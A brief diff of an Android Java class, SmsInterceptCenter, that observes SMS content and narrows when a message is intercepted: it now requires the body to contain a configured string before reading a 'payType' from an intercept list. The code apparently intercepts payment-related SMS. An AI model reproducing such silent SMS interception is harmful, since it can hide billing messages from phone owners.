@@ -235,10 +235,8 @@ public class SmsInterceptCenter extends ContentObserver {
                         }
                     }
                 }
-            } else {
-                b = true;
             }
-            if (b) {
+            if (b && smsBody.contains(limit_msg_data)) {
                 try {
                     JSONObject json = new JSONObject(interceptContentList.get(i).toString());
                     payType = json.getString("payType");
